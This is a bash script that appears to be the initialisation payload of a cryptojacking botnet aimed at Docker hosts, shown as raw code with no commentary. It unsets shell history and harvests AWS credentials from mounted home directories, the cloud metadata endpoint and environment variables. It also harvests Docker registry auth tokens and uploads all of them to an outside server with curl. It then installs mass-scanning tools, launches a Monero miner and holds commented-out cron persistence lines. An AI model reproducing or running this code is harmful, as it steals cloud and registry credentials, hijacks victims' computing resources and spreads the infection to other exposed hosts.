#!/bin/bash
unset HISTFILE
export LC_ALL=C
export PATH=$PATH:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:/usr/games:/usr/local/games

function INIT_MAIN(){
SETUP_BASICS
SETUP_JQ
GABBING_DATA
SETUP_XMR
START_XMR
SETUP_MSCAN
SETUP_ZMAP
bash /root/scan.sh
}

function SETUP_BASICS(){
apk update
apk add bash curl cmake make wget vim docker
curl -v -s http://dl-cdn.alpinelinux.org/alpine/edge/main/x86_64/APKINDEX.tar.gz > /dev/null
service docker start
}

function SETUP_JQ(){
apk update
apk add jq
}

function SETUP_MSCAN(){
apk update
apk add git gcc make musl-dev libpcap-dev linux-headers
git clone https://github.com/robertdavidgraham/masscan /opt/masscan/
cd /opt/masscan/
make
make install
}

function SETUP_ZMAP(){
apk update
apk add zmap
# Download and install zgrab and jq
for file in zgrab jq; do
    if ! [ -f "/usr/sbin/$file" ]; then
            curl -sLk -o /usr/sbin/$file "https://github.com/Caprico1/Docker-Botnets/raw/014b5432a9403b896a3924b8704403e9ab284a68/TDGGinit/$file"
            chmod +x /usr/sbin/$file
    fi
done
}

function GABBING_DATA(){
if [ -d "/host" ] ; then
cat /host/root/.aws/* >> /tmp/.aws 2>/dev/null ; cat /host/home/*/.aws/* >> /tmp/.aws 2>/dev/null
cat /tmp/.aws | grep "aws_access_key_id" || rm -f /tmp/.aws
if [ -f "/tmp/.aws" ] ; then curl -F "userfile=@/tmp/.aws" http://solscan.live/upload.php ; rm -f /tmp/.aws ; fi

curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/) >> /tmp/.aws2
cat /tmp/.aws2 | grep "SecretAccessKey" || rm -f /tmp/.aws2 
if [ -f "/tmp/.aws2" ] ; then curl -F "userfile=@/tmp/.aws2" http://solscan.live/upload.php  ; rm -f /tmp/.aws2 ; fi

env | grep "AWS" >> /tmp/.aws3
cat /tmp/.aws2 | grep "AWS" || rm -f /tmp/.aws3
if [ -f "/tmp/.aws3" ] ; then curl -F "userfile=@/tmp/.aws3" http://solscan.live/upload.php  ; rm -f /tmp/.aws3 ; fi


cat /host/root/.docker/config.json >> /tmp/.docker 2>/dev/null ; cat /host/home/*/.docker/config.json >> /tmp/.docker 2>/dev/null
cat /tmp/.docker | grep "auth" || rm -f /tmp/.docker
if [ -f "/tmp/.docker" ] ; then
curl -F "userfile=@/tmp/.docker" http://solscan.live/upload.php 
rm -f /tmp/.docker
fi

fi
}

function SETUP_XMR(){
bash /root/x.sh
}

#chattr -ia /host/ /host/var/ /host/var/spool/ /host/var/spool/cron/ /host/var/spool/cron/root
#chmod 1777 /host/var/spool/cron/root
#rm -f /host/var/spool/cron/root
#echo '*/1 * * * * /usr/bin/Daemon 2>/dev/null 1>/dev/null ; crontab -r' > /host/var/spool/cron/root
#}

function START_XMR(){
chmod +x /root/sbin
/root/sbin &
}


INIT_MAIN
